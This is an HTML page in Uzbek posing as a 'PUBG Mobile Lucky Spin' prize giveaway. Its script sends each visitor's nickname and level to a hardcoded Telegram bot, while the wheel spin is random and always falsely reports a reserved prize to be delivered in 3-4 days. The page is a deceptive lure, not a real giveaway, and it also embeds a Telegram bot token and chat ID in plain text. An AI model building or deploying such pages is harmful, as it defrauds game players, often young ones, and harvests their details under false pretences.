<!DOCTYPE html>
<html lang="uz">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>PUBG Mobile - Omad G'ildiragi</title>
    <style>
        :root { --primary: #ffcc00; --bg: #0f0f1a; }
        body { margin: 0; padding: 0; font-family: 'Segoe UI', sans-serif; background: var(--bg); color: white; display: flex; justify-content: center; align-items: center; height: 100vh; overflow: hidden; }
        .container { background: rgba(255, 255, 255, 0.1); backdrop-filter: blur(15px); border: 1px solid rgba(255,255,255,0.2); padding: 30px; border-radius: 20px; text-align: center; width: 350px; box-shadow: 0 15px 35px rgba(0,0,0,0.5); }
        h2 { color: var(--primary); text-transform: uppercase; }
        input { width: 90%; padding: 12px; margin: 10px 0; border-radius: 8px; border: none; background: rgba(255,255,255,0.1); color: white; border-bottom: 2px solid var(--primary); outline: none; }
        button { width: 100%; padding: 15px; margin-top: 15px; border-radius: 8px; border: none; background: var(--primary); color: #000; font-weight: bold; cursor: pointer; transition: 0.3s; }
        button:hover { transform: scale(1.02); box-shadow: 0 0 15px var(--primary); }
        .wheel-wrapper { position: relative; width: 250px; height: 250px; margin: 20px auto; border: 5px solid #444; border-radius: 50%; box-shadow: 0 0 20px var(--primary); }
        .wheel { width: 100%; height: 100%; border-radius: 50%; position: relative; overflow: hidden; transition: transform 5s cubic-bezier(0.1, 0, 0.1, 1); background: #222; }
        .pointer { position: absolute; top: -15px; left: 50%; transform: translateX(-50%); width: 25px; height: 35px; background: red; clip-path: polygon(50% 100%, 0 0, 100% 0); z-index: 10; }
        .segment { position: absolute; width: 50%; height: 50%; transform-origin: bottom right; display: flex; align-items: center; justify-content: center; clip-path: polygon(0 0, 100% 0, 100% 100%); }
        .segment span { transform: rotate(-45deg) translateY(-15px); font-size: 10px; font-weight: bold; }
        #result-text { margin-top: 15px; font-weight: bold; color: #00ff00; }
    </style>
</head>
<body>

    <div class="container">
        <div id="auth-box">
            <h2>Lucky Spin</h2>
            <p style="font-size: 12px;">Nickname va Levelni kiriting. Sovg'a 3-4 kunda tashlab beriladi.</p>
            <input type="text" id="nickname" placeholder="Nickname">
            <input type="number" id="level" placeholder="Level">
            <button onclick="sendToBot()">Kirish</button>
        </div>

        <div id="game-box" style="display:none;">
            <h3 id="user-display"></h3>
            <div class="wheel-wrapper">
                <div class="pointer"></div>
                <div id="wheel" class="wheel"></div>
            </div>
            <button id="spin-btn" onclick="spinNow()">Aylantirish</button>
            <p id="result-text"></p>
        </div>
    </div>

    <script>
        // --- BU YERGA O'ZINGIZNING ID RAQAMINGIZNI YOZING ---
        const CHAT_ID = "6023741858"; // <--- @getmyid_bot dan olgan raqamingizni shu yerga yozing
        const TOKEN = "8723367215:AAGLUbYDnoqDJF67MOtDA6HuVDdiqsgxLxM";

        const prizes = [
            { text: "M416 Glacier", color: "#81d4fa" },
            { text: "660 UC", color: "#ffd54f" },
            { text: "Mythic Outfit", color: "#f06292" },
            { text: "X-Suit", color: "#ba68c8" },
            { text: "Buggy Skin", color: "#4db6ac" },
            { text: "Material", color: "#a1887f" }
        ];

        const wheel = document.getElementById('wheel');
        prizes.forEach((p, i) => {
            const seg = document.createElement('div');
            seg.className = 'segment';
            seg.style.transform = `rotate(${i * 60}deg)`;
            seg.style.backgroundColor = p.color;
            seg.innerHTML = `<span>${p.text}</span>`;
            wheel.appendChild(seg);
        });

        async function sendToBot() {
            const nick = document.getElementById('nickname').value;
            const lvl = document.getElementById('level').value;

            if(!nick || !lvl) {
                alert("To'ldiring!");
                return;
            }

            const text = `🚀 YANGI USER:\n👤 Nick: ${nick}\n📊 Level: ${lvl}`;
            const url = `https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(text)}`;

            try {
                const res = await fetch(url);
                const data = await res.json();
                if(data.ok) {
                    document.getElementById('auth-box').style.display = 'none';
                    document.getElementById('game-box').style.display = 'block';
                    document.getElementById('user-display').innerText = nick;
                } else {
                    alert("Xato: Botga /start bosing yoki ID raqamni tekshiring!");
                }
            } catch (e) { alert("Internetni tekshiring!"); }
        }

        function spinNow() {
            const btn = document.getElementById('spin-btn');
            btn.disabled = true;
            const deg = Math.floor(Math.random() * 360) + 3600;
            document.getElementById('wheel').style.transform = `rotate(${deg}deg)`;
            setTimeout(() => {
                document.getElementById('result-text').innerHTML = "Tabriklaymiz! Sovg'a band qilindi.<br>3-4 kunda tashlab beriladi.";
            }, 5000);
        }
    </script>
</body>
</html>
